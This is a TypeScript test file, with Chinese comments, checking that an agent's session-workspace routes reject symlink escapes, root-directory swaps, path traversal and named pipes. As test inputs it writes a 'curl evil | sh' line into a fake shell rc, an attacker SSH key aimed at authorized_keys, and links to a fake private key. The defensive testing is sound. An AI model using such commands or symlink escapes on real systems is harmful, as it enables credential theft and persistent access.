/**
 * 设备能力方案 P1 · K10a(INTEGRATION §4 G4):会话工作区路由(手机经隧道「发附件 / 下载产物」那条路)按真实路径钳在会话工作区内。
 * 真 express + 真 workspace 路由 + 内存 SQLite;brain 不给 storage → 走本地会话目录回退(standalone 未登录 / 云存储探测失败)。
 *
 * P0(aa7150cd)已经把词法拼接换成了 realpath 判定,这里补它漏的:
 *   ① 根锚定:整个会话目录被换成指向外面(家目录)的软链 → P0 把软链目标当新根,`.ssh/id_rsa` 算「在根内」。
 *   ② FIFO:工作区里种一个命名管道,读 / 传都挂死在 open 上(请求永不返回)。
 * 其余用例是每个动词各一条「种软链 → 远端(带隧道标记)取文件」的回归 + 普通文件行为不变的正对照。
 * 检查与打开之间的竞态在 confinedFs.race.test.ts(注入 fs 操作)。
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import express from 'express';
import type { Server } from 'node:http';
import {
  mkdtempSync, rmSync, writeFileSync, symlinkSync, mkdirSync, existsSync, readFileSync, readdirSync, openSync, closeSync, constants as fsc,
} from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { vi } from 'vitest';

vi.hoisted(() => {
  // sessionSandbox 的 BASE_DIR 在模块加载时定:必须早于 import。
  process.env.AGENT_SANDBOX_SESSION_DIR = `${process.env.TMPDIR || '/tmp'}/tangu-k10a-routes-sessions-${process.pid}`;
});

import { configureTangu } from '../src/seams/runtime.js';
import { createTanguProfile } from '../src/profiles/index.js';
import { createSqliteHost } from '../src/adapters/standalone/sqliteHost.js';
import { toSqliteDDL } from '../src/core/dialectDDL.js';
import { STANDALONE_SCHEMA } from '../src/db/schemaStandalone.js';
import { runMigration } from '../src/db/migrate.js';
import workspaceRouter from '../src/routes/workspace.js';
import { getSessionDir } from '../src/sandbox/sessionSandbox.js';

const POSIX = process.platform !== 'win32';
const REMOTE = { 'x-forsion-remote': 'tunnel' }; // 手机经隧道来的请求(unitWeb 盖的来源头);工作区路由对远近一视同仁
let srv: Server;
let base: string;
const tmp: string[] = [];
const mk = (p: string): string => { const d = mkdtempSync(join(tmpdir(), p)); tmp.push(d); return d; };

const req = async (method: string, path: string, body?: unknown, headers: Record<string, string> = REMOTE, timeoutMs = 4000) => {
  const r = await fetch(`${base}${path}`, {
    method,
    headers: { Authorization: 'Bearer x', 'Content-Type': 'application/json', ...headers },
    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
    signal: AbortSignal.timeout(timeoutMs),
  });
  const buf = Buffer.from(await r.arrayBuffer());
  let json: any = null;
  try { json = JSON.parse(buf.toString('utf8')); } catch { /* binary download */ }
  return { status: r.status, json, buf, headers: r.headers };
};
const read = (sid: string, p: string) => req('GET', `/agent/workspace/read?sessionId=${sid}&path=${encodeURIComponent(p)}`);
const download = (sid: string, p: string) => req('GET', `/agent/workspace/download?sessionId=${sid}&path=${encodeURIComponent(p)}`);
const list = async (sid: string): Promise<string[]> => (await req('GET', `/agent/workspace/list?sessionId=${sid}`)).json.files.map((f: any) => f.path).sort();
const upload = (sid: string, files: Array<{ path: string; content: string }>) => req('POST', '/agent/workspace/upload', { sessionId: sid, files });
const sessionDir = (sid: string) => getSessionDir({ userId: 'u1', appId: 'tangu', sessionId: sid, wsProject: null });

/** 一个假「家目录」:.ssh/id_rsa + 一份 shell rc(远程 run 想读 / 想写的典型目标)。 */
function fakeHome(): string {
  const home = mk('tangu-k10a-home-');
  mkdirSync(join(home, '.ssh'));
  writeFileSync(join(home, '.ssh', 'id_rsa'), 'PRIVATE-KEY');
  writeFileSync(join(home, '.zshrc'), 'export SAFE=1\n');
  return home;
}

beforeAll(async () => {
  const { host, db } = createSqliteHost({ dataDir: 'memory', localToken: 'x', userId: 'u1' });
  db.exec(toSqliteDDL(STANDALONE_SCHEMA));
  configureTangu({ host, brain: {} as any, billing: {} as any, profile: createTanguProfile({ sandboxMode: 'none' }) });
  await runMigration();
  const app = express(); app.use(express.json({ limit: '10mb' })); app.use(workspaceRouter);
  srv = app.listen(0); base = `http://127.0.0.1:${(srv.address() as any).port}`;
});
afterAll(async () => {
  srv.closeAllConnections?.();
  await new Promise((r) => srv.close(r));
  for (const d of [...tmp, process.env.AGENT_SANDBOX_SESSION_DIR!]) try { rmSync(d, { recursive: true, force: true }); } catch { /* ignore */ }
});

describe.skipIf(!POSIX)('根锚定:会话目录自身被换成软链', () => {
  it('会话目录 → 家目录的软链:read / download / list / upload 全拒,家目录分毫不动', async () => {
    const sid = 'K10A-ROOT';
    const dir = await sessionDir(sid);
    const home = fakeHome();
    rmSync(dir, { recursive: true, force: true });
    symlinkSync(home, dir); // 远程 run(或它批下来的命令)把整个会话目录换掉

    expect((await read(sid, '.ssh/id_rsa')).status).toBe(404);
    expect((await read(sid, '.zshrc')).status).toBe(404);
    const dl = await download(sid, '.ssh/id_rsa');
    expect(dl.status).toBe(404);
    expect(dl.buf.toString()).not.toContain('PRIVATE-KEY');
    expect(await list(sid)).toEqual([]);
    const up = await upload(sid, [{ path: '.zshrc', content: 'curl evil | sh\n' }, { path: 'dropped.txt', content: 'x' }]);
    expect(up.json.saved).toBe(0);
    expect(readFileSync(join(home, '.zshrc'), 'utf8')).toBe('export SAFE=1\n');
    expect(existsSync(join(home, 'dropped.txt'))).toBe(false);
  });
});

describe.skipIf(!POSIX)('每个动词:工作区里种的软链不把远端带出工作区', () => {
  it('download / read:指向 ~/.ssh 的文件链、目录链、链中链一律 404(普通产物照常下)', async () => {
    const sid = 'K10A-DL';
    const dir = await sessionDir(sid);
    const home = fakeHome();
    writeFileSync(join(dir, 'report.pdf'), 'REAL-ARTIFACT');
    symlinkSync(join(home, '.ssh', 'id_rsa'), join(dir, 'out.txt')); // 看起来像产物的名字
    symlinkSync(join(home, '.ssh'), join(dir, 'artifacts'));
    symlinkSync(join(dir, 'out.txt'), join(dir, 'chain.txt')); // 根内 → 根内的链,终点在根外
    for (const p of ['out.txt', 'artifacts/id_rsa', 'chain.txt', '/out.txt', 'sub/../out.txt']) {
      const d = await download(sid, p);
      expect(d.status, p).toBe(404);
      expect(d.buf.toString(), p).not.toContain('PRIVATE-KEY');
      expect((await read(sid, p)).status, p).toBe(404);
    }
    const ok = await download(sid, 'report.pdf');
    expect(ok.status).toBe(200);
    expect(ok.buf.toString()).toBe('REAL-ARTIFACT');
    expect(ok.headers.get('content-disposition')).toBe(`attachment; filename*=UTF-8''report.pdf`);
    expect(ok.headers.get('content-type')).toContain('application/pdf');
  });

  it('list:指到外面的链、链到目录的链不列,也不跟软链目录往下走', async () => {
    const sid = 'K10A-LIST';
    const dir = await sessionDir(sid);
    const home = fakeHome();
    writeFileSync(join(dir, 'a.txt'), 'aa');
    mkdirSync(join(dir, 'sub'));
    writeFileSync(join(dir, 'sub', 'b.txt'), 'bbb');
    symlinkSync(join(home, '.ssh', 'id_rsa'), join(dir, 'key'));
    symlinkSync(join(home, '.ssh'), join(dir, 'sshdir'));
    symlinkSync(join(dir, 'sub'), join(dir, 'subalias')); // 根内目录链:不列成「文件」
    expect(await list(sid)).toEqual(['/a.txt', '/sub/b.txt']);
  });

  it('upload:经目录链、末段链、悬空链都写不出去;根外文件一字不改', async () => {
    const sid = 'K10A-UP';
    const dir = await sessionDir(sid);
    const home = fakeHome();
    symlinkSync(home, join(dir, 'h'));
    symlinkSync(join(home, '.zshrc'), join(dir, 'notes.txt'));
    symlinkSync(join(home, '.ssh', 'authorized_keys'), join(dir, 'dangle.txt'));
    const up = await upload(sid, [
      { path: 'h/.zshrc', content: 'pwned' },
      { path: 'h/newdir/x.txt', content: 'pwned' },
      { path: 'notes.txt', content: 'pwned' },
      { path: 'dangle.txt', content: 'ssh-ed25519 AAAA attacker' },
      { path: '../escape.txt', content: 'pwned' },
      { path: 'photo.jpg', content: 'JPEG' },
    ]);
    expect(up.json.saved).toBe(1);
    expect(up.json.errors).toHaveLength(5);
    expect(readFileSync(join(home, '.zshrc'), 'utf8')).toBe('export SAFE=1\n');
    expect(existsSync(join(home, 'newdir'))).toBe(false);
    expect(existsSync(join(home, '.ssh', 'authorized_keys'))).toBe(false);
    expect(readFileSync(join(dir, 'photo.jpg'), 'utf8')).toBe('JPEG');
  });

  it('delete(本机专属):经目录链删不到外面', async () => {
    const sid = 'K10A-DEL';
    const dir = await sessionDir(sid);
    const home = fakeHome();
    symlinkSync(join(home, '.ssh'), join(dir, 'k'));
    const r = await req('POST', '/agent/workspace/delete', { sessionId: sid, path: 'k/id_rsa' }, {});
    expect(r.json.ok).toBe(false);
    expect(existsSync(join(home, '.ssh', 'id_rsa'))).toBe(true);
  });
});

describe.skipIf(!POSIX)('FIFO 不挂死路由', () => {
  it('read / download / upload 碰到命名管道立即返回(不等对端);list 不列它', async () => {
    const sid = 'K10A-FIFO';
    const dir = await sessionDir(sid);
    const fifo = join(dir, 'pipe.txt');
    execFileSync('mkfifo', [fifo]);
    try {
      expect((await req('GET', `/agent/workspace/read?sessionId=${sid}&path=pipe.txt`, undefined, REMOTE, 2500)).status).toBe(404);
      expect((await req('GET', `/agent/workspace/download?sessionId=${sid}&path=pipe.txt`, undefined, REMOTE, 2500)).status).toBe(404);
      const up = await req('POST', '/agent/workspace/upload', { sessionId: sid, files: [{ path: 'pipe.txt', content: 'x' }] }, REMOTE, 2500);
      expect(up.json.saved).toBe(0);
      expect(await list(sid)).toEqual([]);
    } finally {
      // 修复前的负对照里 open 会卡在线程池里:这里给它一个对端,让挂着的读 / 写都能收尾(修复后没有挂着的,ENXIO 忽略)。
      for (const flags of [fsc.O_WRONLY | fsc.O_NONBLOCK, fsc.O_RDONLY | fsc.O_NONBLOCK]) {
        try { closeSync(openSync(fifo, flags)); } catch { /* no peer waiting */ }
      }
    }
  });
});

describe('普通文件:行为不变', () => {
  it('上传(含嵌套目录、覆盖更长的旧文件)→ 列 → 读 → 下载 → 删,与 P0 同口径', async () => {
    const sid = 'K10A-NORMAL';
    const dir = await sessionDir(sid);
    writeFileSync(join(dir, 'old.txt'), 'a much longer original content');
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0xff]);
    const up = await req('POST', '/agent/workspace/upload', {
      sessionId: sid,
      files: [
        { path: 'old.txt', content: 'short' },
        { path: '/deep/er/n.md', content: '# hi' },
        { path: 'img.png', content: png.toString('base64'), encoding: 'base64' },
      ],
    });
    expect(up.json).toEqual({ success: true, saved: 3, total: 3, errors: [] });
    expect(readFileSync(join(dir, 'old.txt'), 'utf8')).toBe('short');
    const files = (await req('GET', `/agent/workspace/list?sessionId=${sid}`)).json.files;
    expect(files.map((f: any) => [f.path, f.size, f.mimeType]).sort()).toEqual([
      ['/deep/er/n.md', 4, 'text/markdown'], ['/img.png', 6, 'image/png'], ['/old.txt', 5, 'text/plain'],
    ].sort());
    expect(files.every((f: any) => typeof f.updatedAt === 'number' && f.updatedAt > 0)).toBe(true);
    const r = await read(sid, 'deep/er/n.md');
    expect(r.json).toEqual({ path: 'deep/er/n.md', mimeType: 'text/markdown', content: Buffer.from('# hi').toString('base64'), encoding: 'base64', size: 4 });
    expect((await download(sid, 'img.png')).buf.equals(png)).toBe(true);
    expect((await read(sid, 'nope.txt')).status).toBe(404);
    expect((await read(sid, 'deep')).status).toBe(404); // 目录不是文件
    const del = await req('POST', '/agent/workspace/delete', { sessionId: sid, path: 'old.txt' }, {});
    expect(del.json.ok).toBe(true);
    expect(readdirSync(dir).sort()).toEqual(['deep', 'img.png']);
  });

  it.skipIf(!POSIX)('根内互指的软链照常跟随:读到目标内容,上传写进目标,删只删链接', async () => {
    const sid = 'K10A-INLINK';
    const dir = await sessionDir(sid);
    mkdirSync(join(dir, 'real'));
    writeFileSync(join(dir, 'real', 'data.csv'), 'a,b\n');
    symlinkSync(join(dir, 'real', 'data.csv'), join(dir, 'latest.csv'));
    symlinkSync('real', join(dir, 'cur')); // 相对目录链
    expect(Buffer.from((await read(sid, 'latest.csv')).json.content, 'base64').toString()).toBe('a,b\n');
    expect(Buffer.from((await read(sid, 'cur/data.csv')).json.content, 'base64').toString()).toBe('a,b\n');
    expect(await list(sid)).toEqual(['/latest.csv', '/real/data.csv']);
    const up = await upload(sid, [{ path: 'latest.csv', content: 'c,d\n' }, { path: 'cur/new.csv', content: 'n' }]);
    expect(up.json.saved).toBe(2);
    expect(readFileSync(join(dir, 'real', 'data.csv'), 'utf8')).toBe('c,d\n');
    expect(readFileSync(join(dir, 'real', 'new.csv'), 'utf8')).toBe('n');
    expect((await req('POST', '/agent/workspace/delete', { sessionId: sid, path: 'latest.csv' }, {})).json.ok).toBe(true);
    expect(existsSync(join(dir, 'real', 'data.csv'))).toBe(true);
  });
});
